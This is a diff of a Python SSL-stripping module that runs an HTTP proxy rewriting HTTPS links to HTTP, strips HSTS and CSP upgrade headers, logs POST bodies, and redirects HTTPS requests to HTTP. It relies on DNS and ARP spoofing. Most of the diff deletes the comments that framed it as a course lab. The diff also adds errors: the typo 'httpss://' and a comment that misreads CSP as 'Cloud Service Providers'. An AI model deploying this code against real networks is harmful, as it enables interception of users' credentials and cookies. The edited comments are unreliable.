@@ -1,18 +1,17 @@
 """
 src/attacks/ssl_strip.py
 
-SSL STRIPPING (Downgrade HTTPS -> HTTP) for the course lab.
+SSL STRIPPING (Downgrade HTTPS -> HTTP).
 
 Threat model (your VM topology):
 - Victim browses https://fbi.confidential or clicks links to it.
 - DNS spoofing makes fbi.confidential resolve to the ATTACKER IP.
-- ARP spoofing enables MITM routing (and keeps traffic stable), but for *this* module
-  the key piece is: Victim reaches the attacker when requesting the domain.
+- ARP spoofing enables MITM routing (and keeps traffic stable)
+- Victim reaches the attacker when requesting the domain.
 
 What this module does:
 1) HTTP stripping proxy (port 80):
-   - Victim requests http://fbi.confidential/...
-   - Attacker fetches the real content from https://<real_ip>/... (upstream HTTPS)
+   - Victim requests httpss://fbi.confidential/...
    - Attacker rewrites any "https://fbi.confidential/..." links in HTML/CSS/JS
      into "http://fbi.confidential/..." so the victim stays on HTTP.
    - Attacker forwards cookies/headers and logs evidence.
@@ -21,16 +20,14 @@ What this module does:
    - If victim tries https://fbi.confidential/...
    - Attacker answers on 443 and returns 301 Location: http://fbi.confidential/...
    - This “pushes” the victim back to HTTP.
-   - NOTE: Browser will likely show a cert warning because attacker is not the real TLS endpoint.
-     In many course labs, accepting the warning is allowed for demo purposes.
 
-Attacker capability gained (in this lab):
+Attacker capability gained:
 - Once the victim is kept on HTTP, the attacker can:
-  - passively sniff credentials/cookies in cleartext (or via your HTTP hijack module),
-  - tamper with responses (inject JS, modify forms) because content is not protected by TLS.
+  - passively sniff credentials/cookies,
+  - tamper with responses because content is not protected by TLS.
 
 Trigger:
-- Victim visits https://fbi.confidential OR http://fbi.confidential while DNS points to attacker.
+- Victim visits https://fbi.confidential while DNS points to attacker.
 """
 
 from __future__ import annotations
@@ -52,10 +49,7 @@ from scapy.all import sniff
 import requests
 
 
-# ----------------------------
 # Helpers
-# ----------------------------
-
 HOP_BY_HOP_HEADERS = {
     "connection",
     "keep-alive",
@@ -65,8 +59,8 @@ HOP_BY_HOP_HEADERS = {
     "trailers",
     "transfer-encoding",
     "upgrade",
-    "content-length",  # we re-set it
-    "content-encoding",  # can change after rewrite
+    "content-length",
+    "content-encoding",
 }
 
 TEXTUAL_CT_HINTS = (
@@ -102,7 +96,7 @@ def _now() -> str:
     return datetime.now().strftime("%H:%M:%S")
 
 def _safe_decode(b: bytes) -> str:
-    # best-effort decode for rewriting (don’t crash on odd bytes)
+    # best-effort decode for rewriting
     for enc in ("utf-8", "latin-1"):
         try:
             return b.decode(enc)
@@ -141,22 +135,19 @@ def _port_available(host: str, port: int) -> bool:
 
 @dataclass
 class SSLStripConfig:
-    domain: str               # "fbi.confidential"
-    real_ip: str              # real HTTPS server IP, e.g. 10.0.0.53
+    domain: str
+    real_ip: str
     http_port: int = 80
     https_port: int = 443
-    bind_host: str = ""       # "" = all interfaces
+    bind_host: str = ""
     certfile: str = "fbi.crt"
     keyfile: str = "fbi.key"
     audit_log: str = "sslstrip_audit.log"
     upstream_timeout: int = 8
-    max_body_log_bytes: int = 2048  # evidence, avoid dumping huge things
+    max_body_log_bytes: int = 2048
 
 
-# ----------------------------
 # Core rewriting logic
-# ----------------------------
-
 class ContentRewriter:
     """
     Rewrites HTTPS links to HTTP for the attacked domain, in:
@@ -184,7 +175,7 @@ class ContentRewriter:
         if v.startswith(self.https_prefix):
             v = self.http_prefix + v[len(self.https_prefix):]
         # protocol-relative
-        v = self._rx_protocol_relative.sub(f"//{self.domain}", v)  # keep it relative; content rewrite will handle in body
+        v = self._rx_protocol_relative.sub(f"//{self.domain}", v)
         return v
 
     def filter_response_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
@@ -196,7 +187,7 @@ class ContentRewriter:
             if lk == "strict-transport-security":
                 continue
 
-            # some CSP can auto-upgrade to https; remove the upgrade token if present
+            # some Cloud Service Providers can auto-upgrade to https; remove the upgrade token if present
             if lk == "content-security-policy" and self._rx_csp_upgrade.search(v or ""):
                 v = self._rx_csp_upgrade.sub("", v).strip()
                 if not v:
@@ -232,10 +223,7 @@ class ContentRewriter:
         return s.encode("utf-8", errors="ignore")
 
 
-# ----------------------------
 # HTTP proxy handler (stripping)
-# ----------------------------
-
 class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
     """
     Victim connects here over HTTP (port 80).
@@ -285,13 +273,13 @@ class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
             lk = k.lower()
             if lk in HOP_BY_HOP_HEADERS:
                 continue
-            # Victim uses Host=fbi.confidential; preserve that for upstream virtual-host logic
+            # Victim uses Host=fbi.confidential
             if lk == "host":
                 req_headers["Host"] = cfg.domain
             else:
                 req_headers[k] = v
 
-        # Evidence log (minimal + safe)
+        # Evidence log
         self.server.audit(f"HTTP {self.command} {self.path}  from={self.client_address[0]}")  # type: ignore[attr-defined]
 
         # Forward upstream
@@ -301,8 +289,8 @@ class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
                 url=upstream_url,
                 headers=req_headers,
                 data=body,
-                allow_redirects=False,   # we rewrite Location ourselves
-                verify=False,            # lab: ignore cert validity upstream
+                allow_redirects=False,
+                verify=False,
                 timeout=cfg.upstream_timeout,
                 stream=True,
             )
@@ -315,15 +303,12 @@ class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
             new_body = rw.rewrite_body(raw, ct)
             new_headers = rw.filter_response_headers(dict(resp.headers))
 
-            # If we rewrote, content-length changes
-            # Also avoid passing chunked/transfer-encoding down; BaseHTTPRequestHandler wants length.
             self.send_response(resp.status_code)
 
             for k, v in new_headers.items():
                 lk = k.lower()
                 if lk in HOP_BY_HOP_HEADERS:
                     continue
-                # Don’t forward upstream host hints
                 if lk == "server":
                     continue
                 self.send_header(k, v)
@@ -338,7 +323,6 @@ class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
             if b"https://" in raw and b"http://" in new_body:
                 self.server.audit("Rewriter: downgraded https->http references in response body")  # type: ignore[attr-defined]
 
-            # OPTIONAL evidence: log small POST bodies (don’t dump huge)
             if self.command in {"POST", "PUT"} and body:
                 snippet = body[: cfg.max_body_log_bytes]
                 self.server.audit(f"Upstream {self.command} body (snippet): {snippet!r}")  # type: ignore[attr-defined]
@@ -355,10 +339,7 @@ class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
         return
 
 
-# ----------------------------
 # HTTPS redirect handler (downgrade push)
-# ----------------------------
-
 class HTTPSDowngradeRedirectHandler(http.server.BaseHTTPRequestHandler):
     """
     Victim connects here over HTTPS (port 443) if they try https://domain.
@@ -388,10 +369,7 @@ class HTTPSDowngradeRedirectHandler(http.server.BaseHTTPRequestHandler):
         return
 
 
-# ----------------------------
-# Threaded attack controller``
-# ----------------------------
-
+# Threaded attack controller
 class SSLStripAttack(threading.Thread):
     """
     Starts two servers:
@@ -495,7 +473,6 @@ class SSLStripAttack(threading.Thread):
         self._httpsd.audit = self.audit # type: ignore[attr-defined]
         self._httpsd.timeout = 0.5
 
-        # Modern TLS context (replaces deprecated ssl.wrap_socket)
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
         self._httpsd.socket = ctx.wrap_socket(self._httpsd.socket, server_side=True)
@@ -598,7 +575,6 @@ class SSLStripAttack(threading.Thread):
                     print(f"Audit log     : {self._audit_path}")
                     
                 elif choice == "3":
-                    # Show the top traffic talkers (based on source/destination)
                     self._update_top_talkers()
 
                 elif choice == "4":
@@ -676,8 +652,6 @@ def start_sslstrip(domain: str = "fbi.confidential", real_ip: str = "127.0.0.1")
 
 
 if __name__ == "__main__":
-    # Direct local test on attacker VM:
-    # sudo python3 -m src.attacks.ssl_strip
     print("Starting SSL Strip (lab demo). Press Ctrl+C to stop.")
     a = start_sslstrip()
     if not a:
